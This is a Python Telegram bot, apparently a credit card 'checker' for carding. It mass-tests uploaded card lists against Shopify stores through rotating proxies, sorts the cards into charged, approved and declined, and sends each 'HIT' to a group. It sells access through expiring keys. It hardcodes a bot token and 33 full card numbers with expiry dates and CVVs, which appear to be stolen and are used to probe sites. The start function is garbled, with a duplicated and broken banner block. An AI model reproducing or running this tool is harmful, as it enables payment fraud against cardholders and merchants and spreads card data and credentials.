#!/usr/bin/env python3
# MORO Admin Bot - Unified Board (moro11)

import asyncio, json, os, logging, random, string, aiohttp, time
from datetime import datetime, timedelta
from io import BytesIO
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.error import TimedOut, NetworkError, BadRequest

from api import process_card, parse_cc_string, extract_clean_response

# ========== CONFIG ==========
TOKEN = "8344301898:AAFbiJUBUqgMHTsCKQ9rniTlVxw8AL4gIoY"                     # <-- PALITAN
ADMIN_IDS = [5402903062]                           # <-- ILAGAY MGA ADMIN ID
KEYS_FILE = "keys.json"
PROXIES_FILE = "proxies.txt"
SITES_FILE = "sites.txt"
NOTIFY_GROUP_ID = None

if not os.path.exists(KEYS_FILE):
    with open(KEYS_FILE, 'w') as f: json.dump({}, f)

def load_keys():
    with open(KEYS_FILE) as f: return json.load(f)
def save_keys(keys):
    with open(KEYS_FILE, 'w') as f: json.dump(keys, f, indent=2)
def generate_random_key(length=12):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def load_proxies():
    if not os.path.exists(PROXIES_FILE): return []
    with open(PROXIES_FILE) as f: return [line.strip() for line in f if line.strip()]
def save_proxies(proxies):
    with open(PROXIES_FILE, 'w') as f:
        for p in proxies: f.write(p + '\n')
def load_sites():
    if not os.path.exists(SITES_FILE): return []
    with open(SITES_FILE) as f: return [line.strip() for line in f if line.strip()]
def save_sites(sites):
    with open(SITES_FILE, 'w') as f:
        for s in sites: f.write(s + '\n')

# ========== UNIFIED BOARD ==========
def get_board_keyboard(session, is_admin=False, screen='main'):
    if screen == 'main':
        buttons = [
            [InlineKeyboardButton("▸ Single Check ▸", callback_data="single_check"),
             InlineKeyboardButton("◆ Mass Check ◆", callback_data="mass_check")],
        ]
        if is_admin:
            buttons.append([InlineKeyboardButton("🔑 Generate Key", callback_data="gen_key"),
                            InlineKeyboardButton("🔄 Revoke Key", callback_data="revoke_key")])
            buttons.append([InlineKeyboardButton("🌐 Add Proxy", callback_data="add_proxy"),
                            InlineKeyboardButton("🗑 Remove Proxy", callback_data="remove_proxy")])
            buttons.append([InlineKeyboardButton("➕ Add Single Proxy", callback_data="add_single_proxy")])
            buttons.append([InlineKeyboardButton("✅ Check Proxy", callback_data="check_proxy"),
                            InlineKeyboardButton("🗑 Remove Site", callback_data="remove_site")])
            buttons.append([InlineKeyboardButton("👥 Admin List", callback_data="admin_list")])
        return InlineKeyboardMarkup(buttons)
    else:  # mass screen
        has_cards = bool(session.get("cards"))
        has_sites = bool(session.get("sites"))
        btns = [
            [InlineKeyboardButton("▷ Upload Cards", callback_data="upload_cards"),
             InlineKeyboardButton("▷ Upload Sites", callback_data="upload_sites")],
        ]
        if has_sites:
            btns.append([InlineKeyboardButton("🔍 Test Sites", callback_data="test_sites")])
        btns.append([InlineKeyboardButton("▶ START", callback_data="start_mass"),
                     InlineKeyboardButton("⏹ STOP", callback_data="stop")])
        ch = session.get("counters",{}).get("charged",0)
        ap = session.get("counters",{}).get("approved",0)
        de = session.get("counters",{}).get("declined",0)
        er = session.get("counters",{}).get("error",0)
        btns.append([
            InlineKeyboardButton(f"CHARGED:{ch}", callback_data="noop"),
            InlineKeyboardButton(f"APPROVED:{ap}", callback_data="noop"),
        ])
        btns.append([
            InlineKeyboardButton(f"DECLINED:{de}", callback_data="noop"),
            InlineKeyboardButton(f"ERROR:{er}", callback_data="noop"),
        ])
        btns.append([InlineKeyboardButton("📥 Download Results", callback_data="download_results")])
        btns.append([InlineKeyboardButton("↩ Main Menu ↩", callback_data="main_menu")])
        return InlineKeyboardMarkup(btns)

def running_keyboard(counters):
    ch, ap, de, er = counters.get("charged",0), counters.get("approved",0), counters.get("declined",0), counters.get("error",0)
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⏹ STOP", callback_data="stop")],
        [InlineKeyboardButton(f"CHARGED: {ch}", callback_data="noop"),
         InlineKeyboardButton(f"APPROVED: {ap}", callback_data="noop")],
        [InlineKeyboardButton(f"DECLINED: {de}", callback_data="noop"),
         InlineKeyboardButton(f"ERROR: {er}", callback_data="noop")],
        [InlineKeyboardButton("↩ Main Menu ↩", callback_data="main_menu")]
    ])

# ========== USER SESSIONS ==========
user_sessions = {}

# ========== CARD CHECKING HELPERS ==========
WORKING_KEYWORDS = [
    'card_declined','fraud','incorrect_zip','invalid_cvc','invalid_cvv',
    'insufficient_funds','otp_required','order_placed','declined',
    'do_not_honor','incorrect_number','card_incorrect','expired_card',
    'pickup_card','restricted_card','stolen_card','lost_card',
    'card_velocity_exceeded','transaction_not_allowed','invalid_expiry',
    'processing_error','call_issuer','try_again_later','fraudulent',
    'security_violation','blocked','bad_cvv','cvv_fail',
    'authentication_required','mismatched_bill','charged','approved',
    'wrong_number','incorrect number','card incorrect'
]
DEAD_KEYWORDS = [
    'receipt id is empty','handle is empty','product id is empty',
    'tax amount is empty','payment method identifier is empty',
    'invalid url','error in 1st req','error in 1 req',
    'cloudflare','connection failed','timed out',
    'access denied','tlsv1 alert','ssl routines',
    'could not resolve','domain name not found',
    'name or service not known','openssl ssl_connect',
    'empty reply from server','httperror504','http error',
    'timeout','unreachable','ssl error',
    '502','503','504','bad gateway','service unavailable',
    'gateway timeout','network error','connection reset',
    'failed to detect product','failed to create checkout',
    'failed to tokenize card','failed to get proposal data',
    'submit rejected','handle error','http 404',
    'delivery_delivery_line_detail_changed','delivery_address2_required',
    'url rejected','malformed input','amount_too_small','amount too small',
    'site dead','captcha_required','captcha required','site errors',
    'all products sold out','no_session_token','tokenize_fail',
    'generic_error','generic error','payments_credit_card_generic',
    'delivery_no_delivery_strategy_available_for_merchandise_line',
    'no_variants','rate_limited',
    'merchandise_product_not_published_in_buyer_location',
    'merchandise_out_of_stock','faild_to_add_to_cart','waiting_pending_terms',
    'payments_credit_card_number_invalid_format','merchandise_expected_price_mismatch',
    'status: 429','site not supported','429','PAYMENTS_CREDIT_CARD_BASE_EXPIRED',
    'Failed to get session token'
]
TEST_CARDS = [
    "5275150060415544|05|27|803","5275150094498722|06|28|271","5597580170432727|02|29|669",
    "4890222002785710|08|29|313","4147342094178599|10|27|885","5275150165633736|11|29|675",
    "5143773871130026|05|26|705","5275150182030312|08|29|950","4031633018355571|06|28|951",
    "4064980980901258|12|30|252","4060490108180441|07|27|597","4019240129644962|12|26|434",
    "4031632382175870|06|28|166","4031630843959817|11|29|534","4386300000897744|09|28|933",
    "4522160009999007|05|27|547","4342573011316291|03|26|197","4232231190652704|04|29|831",
    "5275150044864536|01|29|779","4917670019908882|11|29|380","5296290500170740|08|30|887",
    "4737034040156359|08|27|890","4430473070970562|10|26|333","5275150085373975|05|30|322",
    "5275150355918699|05|30|547","5275150170503874|10|29|222","4693080245712985|06|26|430",
    "5731829501643875|08|31|954","5425437707208757|06|29|752","4031635456197985|05|28|854",
    "4669912628749442|12|31|554","4141700008152347|06|29|871","4117774007477849|03|28|104",
]

def classify_card_result(success, message):
    msg = message.lower()
    if 'order_placed' in msg: return 'charged'
    if 'otp_required' in msg: return 'approved'
    if any(k in msg for k in ['approved','insufficient','cvv','cvc','zip','incorrect_zip','invalid_cvv','invalid_cvc','insufficient_funds']):
        return 'approved'
    if success: return 'declined'
    for kw in WORKING_KEYWORDS:
        if kw in msg: return 'declined'
    return 'error'

def is_site_alive(message):
    msg = message.lower()
    if any(k in msg for k in WORKING_KEYWORDS): return True
    if any(k in msg for k in DEAD_KEYWORDS): return False
    return False

async def get_bin_info(cc):
    try:
        async with aiohttp.ClientSession() as session:
            bin6 = cc[:6]
            async with session.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=5) as res:
                if res.status == 200:
                    data = await res.json()
                    return (data.get('brand','UNKNOWN'), data.get('bank','UNKNOWN'),
                            data.get('country_name','UNKNOWN'), data.get('level','N/A'),
                            data.get('type','N/A'), data.get('country_flag',''))
    except: pass
    return ("UNKNOWN","UNKNOWN","UNKNOWN","N/A","N/A","")

async def process_card_with_retry(cc, mes, ano, cvv, site, proxy_str=None, max_retries=3):
    for attempt in range(max_retries):
        try:
            success, message, gateway, price, currency = await asyncio.wait_for(
                process_card(cc, mes, ano, cvv, site, proxy_str=proxy_str), timeout=60.0)
        except asyncio.TimeoutError:
            return False, 'Timeout', '', '0', 'USD'
        msg_lower = message.lower()
        if any(k in msg_lower for k in ['429','503','too many requests','service unavailable']):
            wait = 5 * (attempt + 1)
            await asyncio.sleep(wait)
            continue
        return success, message, gateway, price, currency
    return success, message, gateway, price, currency

async def process_one_card(cc_line, site, proxy=None):
    try: parts = parse_cc_string(cc_line)
    except: return 'error', cc_line, "Invalid Format", "","",""
    if not site.startswith('http'): site = 'https://'+site
    success, message, gateway, price, currency = await process_card_with_retry(
        parts['cc'], parts['mes'], parts['ano'], parts['cvv'], site, proxy_str=proxy
    )
    cat = classify_card_result(success, message)
    clean = extract_clean_response(message)
    info = await get_bin_info(parts['cc'])
    return cat, cc_line, clean, price, currency, info

# ========== SITE TESTING ==========
async def test_sites_with_progress(sites, context, chat_id, message_id, session):
    alive = []
    total = len(sites)
    proxies = load_proxies()
    header = "Testing Sites...\n"
    await context.bot.edit_message_text(
        chat_id=chat_id, message_id=message_id,
        text=header + f"Progress: 0/{total}  +0  -0",
        reply_markup=get_board_keyboard(session, False, 'mass')
    )
    sem = asyncio.Semaphore(4)
    progress = 0; working = 0; dead = 0
    stop_event = asyncio.Event()
    session["stop_event"] = stop_event

    async def test_one(site):
        nonlocal progress, working, dead
        if stop_event.is_set(): return
        async with sem:
            if stop_event.is_set(): return
            await asyncio.sleep(random.uniform(0.5, 1.5))
            if stop_event.is_set(): return
            card_line = random.choice(TEST_CARDS)
            proxy = random.choice(proxies) if proxies else None
            try:
                parts = parse_cc_string(card_line)
                url = site if site.startswith('http') else 'https://'+site
                _, message, _, _, _ = await process_card_with_retry(
                    parts['cc'], parts['mes'], parts['ano'], parts['cvv'], url, proxy_str=proxy
                )
                if stop_event.is_set(): return
                if is_site_alive(message):
                    alive.append(url); working += 1
                else:
                    dead += 1
            except:
                dead += 1
            progress += 1
            if stop_event.is_set(): return
            if progress % 2 == 0 or progress == total:
                lines = [header, f"Progress: {progress}/{total}  +{working}  -{dead}"]
                if alive:
                    lines.append("[+] Goodsites:")
                    for s in alive[-5:]:
                        lines.append(f"[+] {s}")
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id, message_id=message_id,
                        text="\n".join(lines),
                        reply_markup=get_board_keyboard(session, False, 'mass')
                    )
                except: pass

    tasks = [asyncio.create_task(test_one(s)) for s in sites]
    session["test_tasks"] = tasks
    await asyncio.gather(*tasks, return_exceptions=True)
    session.pop("test_tasks", None)
    session.pop("stop_event", None)
    return alive

async def run_test_sites(user_id, context):
    session = user_sessions.get(user_id)
    if not session: return
    sites = session.get("sites", [])
    msg_id = session.get("message_id")
    if msg_id:
        alive = await test_sites_with_progress(sites, context, session["chat_id"], msg_id, session)
    else:
        alive = await test_all_sites(sites)
    session["sites"] = alive
    save_sites(alive)
    if msg_id:
        await context.bot.edit_message_text(
            chat_id=session["chat_id"], message_id=msg_id,
            text=f"Dashboard\n+ {len(alive)} goods sites out of {len(sites)} tested.",
            reply_markup=get_board_keyboard(session, False, 'mass'))

# ========== MASS CHECKER WITH GROUP NOTIFICATION ==========
async def mass_checker_task(user_id, app):
    session = user_sessions.get(user_id)
    if not session: return
    cards = session.get("cards", [])
    sites = session.get("sites", [])
    if not cards or not sites:
        await app.bot.send_message(chat_id=session["chat_id"], text="No cards or sites.")
        return
    proxies = load_proxies()
    counters = {"charged":0,"approved":0,"declined":0,"error":0}
    total = len(cards); checked = 0
    total_sum = 0.0
    session["counters"] = counters
    stop_event = asyncio.Event(); session["stop_event"] = stop_event
    charged_buf, approved_buf, declined_buf, error_buf = [], [], [], []

    msg_id = session.get("message_id")
    if msg_id:
        await app.bot.edit_message_reply_markup(
            chat_id=session["chat_id"], message_id=msg_id,
            reply_markup=running_keyboard(counters)
        )
    sem = asyncio.Semaphore(6)

    async def worker(idx, card_line):
        nonlocal checked, total_sum
        if stop_event.is_set(): return
        async with sem:
            if stop_event.is_set(): return
            await asyncio.sleep(random.uniform(0.2, 0.8))
            if stop_event.is_set(): return
            site = sites[idx % len(sites)]
            proxy = random.choice(proxies) if proxies else None
            cat, cc_line, clean, price, currency, info = await process_one_card(card_line, site, proxy=proxy)
            if stop_event.is_set(): return
            counters[cat] = counters.get(cat, 0) + 1
            checked += 1
            total_sum += float(price) if price and price != '0' else 0
            brand, bank, country, level, type_cc, flag = info
            price_str = f"${float(price):.2f} {currency}" if price and price != '0' else "Free"
            log_line = (
                f"Card: {cc_line}\nStatus: {cat.upper()}\nResponse: {clean}\nGateway: Shopify Payments\n"
                f"Price: {price_str}\nInfo: {brand} - {type_cc.upper()} - {level.upper()}\n"
                f"Bank: {bank}\nCountry: {country} {flag}\n{'-'*30}\n"
            )
            if cat == 'charged': charged_buf.append(log_line)
            elif cat == 'approved': approved_buf.append(log_line)
            elif cat == 'declined': declined_buf.append(log_line)
            else: error_buf.append(log_line)

            if NOTIFY_GROUP_ID and cat in ("charged", "approved", "declined"):
                try:
                    await app.bot.send_message(
                        chat_id=NOTIFY_GROUP_ID,
                        text=f"HIT {cat.upper()} | {cc_line} | {clean} | {site}"
                    )
                except: pass

            if stop_event.is_set(): return
            if checked % 5 == 0 or checked == total:
                try:
                    await app.bot.edit_message_reply_markup(
                        chat_id=session["chat_id"], message_id=msg_id,
                        reply_markup=running_keyboard(counters))
                except: pass

    tasks = [asyncio.create_task(worker(i, c)) for i, c in enumerate(cards)]
    session["mass_tasks"] = tasks
    await asyncio.gather(*tasks, return_exceptions=True)
    session.pop("mass_tasks", None)

    def write_buf(filename, lines):
        if lines:
            with open(filename, 'w', encoding='utf-8') as f: f.write(''.join(lines))
    write_buf('charged.txt', charged_buf); write_buf('approved.txt', approved_buf)
    write_buf('declined.txt', declined_buf); write_buf('error.txt', error_buf)

    session["result_files"] = {
        "charged.txt": charged_buf, "approved.txt": approved_buf,
        "declined.txt": declined_buf, "error.txt": error_buf,
    }

    live = counters["approved"] + counters["declined"]
    summary = (
        f"Results\nTotal: {total}\nChecked: {checked}\n"
        f"Charged: {counters['charged']}\nApproved: {counters['approved']}\n"
        f"Declined: {counters['declined']}\nDead: {counters['error']}\n"
        f"Total Amount: ${total_sum:.2f}\n"
        f"Gateway: Shopify Payments\nHits\n\nPindutin 'Download Results' para sa files."
    )
    if msg_id:
        try:
            await app.bot.edit_message_text(
                chat_id=session["chat_id"], message_id=msg_id,
                text=summary, reply_markup=get_board_keyboard(session, False, 'mass'))
        except:
            await app.bot.send_message(chat_id=session["chat_id"], text=summary)
    else:
        await app.bot.send_message(chat_id=session["chat_id"], text=summary)

    session.pop("stop_event", None)
    user_sessions[user_id]["running_task"] = None

# ========== HANDLERS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_admin = user_id in ADMIN_IDS
    if not is_admin:
        keys = load_keys()
        valid = any(v.get("user_id") == user_id and datetime.fromisoformat(v.get("expires", "2000")) > datetime.now() for v in keys.values())
        if not valid:
            await update.message.reply_text("Kailangan mo ng valid key.")
            return
    # Maangas na welcome banner
    banner = (
        "╔══════════════════════════╗
"
        "║     🛡️ MORO CHECKER 🛡️     ║
"
        "║   ⚡ by MORO NOT PRO ⚡   ║
"
        "╚══════════════════════════╝"
    )
    await update.message.reply_text(banner)
    user_sessions[user_id] = {
        "cards":[], "sites":[], "counters":{}, "running_task":None,
        "chat_id":update.effective_chat.id, "message_id":None,
        "awaiting_upload":None, "result_files":{}, "screen":"main"
    }
    msg = await update.message.reply_text(
banner = (
            "╔══════════════════════════╗\n"
            "║     🛡️ MORO CHECKER 🛡️     ║\n"
            "║   ⚡ by MORO NOT PRO ⚡   ║\n"
            "╚══════════════════════════╝"
        )
        await update.message.reply_text(banner)
        # Now send the board as a separate message
        msg = await update.message.reply_text(
            "━━━━━━━━━━━━━━━\nMORO CONTROL PANEL\n━━━━━━━━━━━━━━━",
        reply_markup=get_board_keyboard(user_sessions[user_id], is_admin, 'main')
    )
    user_sessions[user_id]["message_id"] = msg.message_id

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try: await query.answer()
    except BadRequest: pass
    user_id = query.from_user.id; is_admin = user_id in ADMIN_IDS
    session = user_sessions.get(user_id, {}); data = query.data

    async def update_dashboard(text=None, keyboard=None):
        msg_id = session.get("message_id")
        if msg_id and text and keyboard:
            try:
                await context.bot.edit_message_text(
                    chat_id=session["chat_id"], message_id=msg_id,
                    text=text, reply_markup=keyboard)
                return True
            except: pass
        if text and keyboard:
            msg = await context.bot.send_message(chat_id=session["chat_id"], text=text, reply_markup=keyboard)
            session["message_id"] = msg.message_id
            return True
        return False

    if data == "main_menu":
        session["screen"] = "main"
        await update_dashboard("╔══════════════════════════╗\n║     🛡️ MORO CHECKER 🛡️     ║\n║   ⚡ by MORO NOT PRO ⚡   ║\n╚══════════════════════════╝\n\nMORO CONTROL PANEL", get_board_keyboard(session, is_admin, 'main'))
    elif data == "single_check":
        await update_dashboard("Ipadala: /check cc|mm|yy|cvv site", get_board_keyboard(session, is_admin, 'main'))
    elif data == "mass_check":
        session["screen"] = "mass"
        await update_dashboard("Mass Check Board", get_board_keyboard(session, is_admin, 'mass'))
    elif data == "download_results":
        files = session.get("result_files", {})
        if not files: await query.answer("Walang result files."); return
        for fname, lines in files.items():
            if lines:
                buf = BytesIO(''.join(lines).encode('utf-8')); buf.name = fname
                await context.bot.send_document(chat_id=session["chat_id"], document=buf, caption=fname)
        await query.answer("Na-send.")
    elif data == "gen_key":
        if not is_admin: return
        keys = load_keys(); new_key = generate_random_key()
        keys[new_key] = {"created": str(datetime.now()), "expires": str(datetime.now() + timedelta(days=7)), "user_id": None}
        save_keys(keys)
        await update_dashboard(f"Bagong key: {new_key}\nExpires: 7 days", get_board_keyboard(session, is_admin, 'main'))
    elif data == "revoke_key":
        if not is_admin: return
        keys = load_keys()
        if not keys: await update_dashboard("Walang keys.", get_board_keyboard(session, is_admin, 'main'))
        else:
            kb = [[InlineKeyboardButton(k, callback_data=f"revoke_{k}")] for k in keys]
            kb.append([InlineKeyboardButton("Back", callback_data="main_menu")])
            await update_dashboard("Pumili ng key:", InlineKeyboardMarkup(kb))
    elif data.startswith("revoke_"):
        if not is_admin: return
        key = data.replace("revoke_", ""); keys = load_keys()
        keys.pop(key, None); save_keys(keys)
        await update_dashboard(f"Key {key} revoked.", get_board_keyboard(session, is_admin, 'main'))
    elif data == "add_proxy":
        if not is_admin: return
        session["awaiting_upload"] = "proxy"
        await update_dashboard("Ipadala ang proxy file (.txt).", get_board_keyboard(session, is_admin, 'main'))
    elif data == "remove_proxy":
        if not is_admin: return
        proxies = load_proxies()
        if not proxies: await update_dashboard("Walang proxies.", get_board_keyboard(session, is_admin, 'main'))
        else:
            kb = [[InlineKeyboardButton(p, callback_data=f"delproxy_{p}")] for p in proxies[:20]]
            kb.append([InlineKeyboardButton("Back", callback_data="main_menu")])
            await update_dashboard("Pumili ng proxy:", InlineKeyboardMarkup(kb))
    elif data.startswith("delproxy_"):
        if not is_admin: return
        proxy = data.replace("delproxy_", ""); proxies = load_proxies()
        if proxy in proxies: proxies.remove(proxy); save_proxies(proxies)
        await update_dashboard(f"Tinanggal: {proxy}", get_board_keyboard(session, is_admin, 'main'))
    elif data == "check_proxy":
        if not is_admin: return
        proxies = load_proxies()
        if not proxies: await update_dashboard("Walang proxies.", get_board_keyboard(session, is_admin, 'main')); return
        await update_dashboard("Sinusuri ang proxies...", None)
        working = []
        async def test(p):
            try:
                async with aiohttp.ClientSession() as s:
                    async with s.get("http://httpbin.org/ip", proxy=p, timeout=10) as r:
                        if r.status == 200: working.append(p)
            except: pass
        await asyncio.gather(*[test(p) for p in proxies[:20]], return_exceptions=True)
        await update_dashboard(f"Working proxies: {len(working)}/{len(proxies)}\n" + "\n".join(working[:10]),
                               get_board_keyboard(session, is_admin, 'main'))
    elif data == "remove_site":
        if not is_admin: return
        sites = load_sites()
        if not sites: await update_dashboard("Walang sites.", get_board_keyboard(session, is_admin, 'main'))
        else:
            kb = [[InlineKeyboardButton(s, callback_data=f"delsite_{s}")] for s in sites[:20]]
            kb.append([InlineKeyboardButton("Back", callback_data="main_menu")])
            await update_dashboard("Pumili ng site:", InlineKeyboardMarkup(kb))
    elif data.startswith("delsite_"):
        if not is_admin: return
        site_to_remove = data.replace("delsite_", ""); sites = load_sites()
        if site_to_remove not in sites: await query.answer("Site not found."); return
        old_sites = sites.copy(); sites.remove(site_to_remove); save_sites(sites)
        await update_dashboard("Re-testing remaining sites...", None)
        alive = await test_all_sites(sites)
        if not alive:
            save_sites(old_sites); session["sites"] = old_sites
            await update_dashboard(f"Tinanggal: {site_to_remove}\nWalang goods sites na natira.\nKaya binalik ang dating list.", get_board_keyboard(session, is_admin, 'main'))
            return
        session["sites"] = alive; save_sites(alive)
        await update_dashboard(f"Dashboard\n+ {len(alive)} goods sites (re-tested).",
                               get_board_keyboard(session, is_admin, 'mass'))
    elif data == "admin_list":
        if not is_admin: return
        admins = [str(a) for a in ADMIN_IDS]
        await update_dashboard(f"Admins:\n" + "\n".join(admins), get_board_keyboard(session, is_admin, 'main'))
    elif data == "upload_cards":
        session["awaiting_upload"] = "cards"
        await update_dashboard("Ipadala ang file ng cards.", get_board_keyboard(session, is_admin, 'mass'))
    elif data == "upload_sites":
        session["awaiting_upload"] = "sites"
        await update_dashboard("Ipadala ang file ng sites.", get_board_keyboard(session, is_admin, 'mass'))
    elif data == "test_sites":
        if not session.get("sites"): await query.answer("Walang sites."); return
        asyncio.create_task(run_test_sites(user_id, context))
        await query.answer("Site testing started...")
    elif data == "start_mass":
        if not session.get("cards") or not session.get("sites"): await query.answer("I-upload muna pareho."); return
        task = asyncio.create_task(mass_checker_task(user_id, context.application))
        session["running_task"] = task
        await query.answer("Mass checking started.")
    elif data == "stop":
        test_tasks = session.get("test_tasks")
        if test_tasks:
            for t in test_tasks:
                if not t.done(): t.cancel()
        mass_tasks = session.get("mass_tasks")
        if mass_tasks:
            for t in mass_tasks:
                if not t.done(): t.cancel()
        stop_event = session.get("stop_event")
        if stop_event: stop_event.set()
        await query.answer("Stopping...")
    elif data == "add_single_proxy":
        if not is_admin: return
        session["awaiting_upload"] = "single_proxy"
        await query.edit_message_text("Ipadala ang proxy string (ip:port o user:pass@ip:port).")
    else: pass

async def text_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    session = user_sessions.get(user_id)
    if not session or session.get("awaiting_upload") != "single_proxy": return
    proxy_str = update.message.text.strip()
    if not proxy_str: await update.message.reply_text("Walang laman."); session["awaiting_upload"] = None; return
    msg = await update.message.reply_text("Sinusuri ang proxy...")
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get("http://httpbin.org/ip", proxy=proxy_str, timeout=10) as r:
                if r.status == 200:
                    current = load_proxies()
                    if proxy_str not in current: current.append(proxy_str); save_proxies(current)
                    await msg.edit_text(f"Working proxy & saved: {proxy_str}")
                else:
                    await msg.edit_text(f"Not working: {proxy_str}")
    except:
        await msg.edit_text(f"Not working: {proxy_str}")
    session["awaiting_upload"] = None

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    session = user_sessions.get(user_id)
    if not session: return
    awaiting = session.get("awaiting_upload")
    if not awaiting: await update.message.reply_text("Gamitin muna ang menu."); return
    file = update.message.document
    file_bytes = await context.bot.get_file(file.file_id)
    data = await file_bytes.download_as_bytearray()
    content = data.decode("utf-8").strip()
    lines = [l.strip() for l in content.splitlines() if l.strip()]

    try: await update.message.delete()
    except: pass

    if awaiting == "cards":
        session["cards"] = lines
        await update.message.reply_text(f"{len(lines)} cards uploaded.")
    elif awaiting == "sites":
        session["sites"] = lines
        with open("uploaded_sites.txt", "w") as f:
            f.write("\n".join(lines))
        await update.message.reply_text(f"{len(lines)} sites uploaded.")
    elif awaiting == "proxy":
        msg = await update.message.reply_text("Sinusuri ang proxies...")
        working = []
        async def test_proxy(p):
            try:
                async with aiohttp.ClientSession() as s:
                    async with s.get("http://httpbin.org/ip", proxy=p, timeout=10) as r:
                        if r.status == 200: working.append(p)
            except: pass
        await asyncio.gather(*[test_proxy(p) for p in lines], return_exceptions=True)
        save_proxies(working)
        await msg.edit_text(f"{len(working)}/{len(lines)} proxies working & saved.\n" + "\n".join(working[:10]))
    session["awaiting_upload"] = None

    msg_id = session.get("message_id")
    if msg_id:
        try:
            await context.bot.edit_message_reply_markup(
                chat_id=session["chat_id"], message_id=msg_id,
                reply_markup=get_board_keyboard(session, False, session.get("screen","main")))
        except: pass

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or len(context.args) < 2:
        await update.message.reply_text("Gamitin: /check cc|mm|yy|cvv site")
        return
    try: await update.message.delete()
    except: pass
    cc = context.args[0]; site = context.args[1]
    processing_msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="Processing...")
    cat, cc_line, clean, price, currency, info = await process_one_card(cc, site)
    brand, bank, country, level, type_cc, flag = info
    info_str = f"{brand} - {type_cc.upper()} - {level.upper()}" if level != 'N/A' else f"{brand} - {type_cc.upper()}"
    price_fmt = f"${float(price):.2f} {currency}" if price and price != '0' else "Free"
    result = (
        f"Card: {cc_line}\nStatus: {cat.upper()}\nResponse: {clean}\n"
        f"Price: {price_fmt}\nInfo: {info_str}\nBank: {bank}\nCountry: {country} {flag}"
    )
    await processing_msg.edit_text(result)

async def groupid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"Group ID: {update.effective_chat.id}")

async def setgroup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS: await update.message.reply_text("Admin only."); return
    if not context.args: await update.message.reply_text("Gamitin: /setgroup <group_id>"); return
    try:
        group_id = int(context.args[0])
        global NOTIFY_GROUP_ID; NOTIFY_GROUP_ID = group_id
        await update.message.reply_text(f"Notification group set to {group_id}")
    except: await update.message.reply_text("Invalid group ID.")

async def cleargroup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global NOTIFY_GROUP_ID
    NOTIFY_GROUP_ID = None
    await update.message.reply_text("Group notification cleared.")

def main():
    while True:
        try:
            app = Application.builder().token(TOKEN).connect_timeout(30).read_timeout(30).build()
            app.add_handler(CommandHandler("start", start))
            app.add_handler(CommandHandler("check", check_command))
            app.add_handler(CommandHandler("groupid", groupid))
            app.add_handler(CommandHandler("setgroup", setgroup))
            app.add_handler(CommandHandler("cleargroup", cleargroup))
            app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_message_handler))
            app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
            app.add_handler(CallbackQueryHandler(button_handler))
            print("Bot running... (moro11)")
            app.run_polling(drop_pending_updates=True)
        except (TimedOut, NetworkError) as e:
            print(f"Connection lost: {e}. Reconnecting in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f"Fatal error: {e}")
            break

if __name__ == "__main__":
    async def test_all_sites(sites):
        alive = []
        proxies = load_proxies()
        async def test_one(s):
            try:
                card_line = random.choice(TEST_CARDS)
                parts = parse_cc_string(card_line)
                url = s if s.startswith('http') else 'https://'+s
                proxy = random.choice(proxies) if proxies else None
                _, message, _, _, _ = await process_card_with_retry(
                    parts['cc'], parts['mes'], parts['ano'], parts['cvv'], url, proxy_str=proxy
                )
                if is_site_alive(message): alive.append(url)
            except: pass
        await asyncio.gather(*[test_one(s) for s in sites], return_exceptions=True)
        return alive

    main()
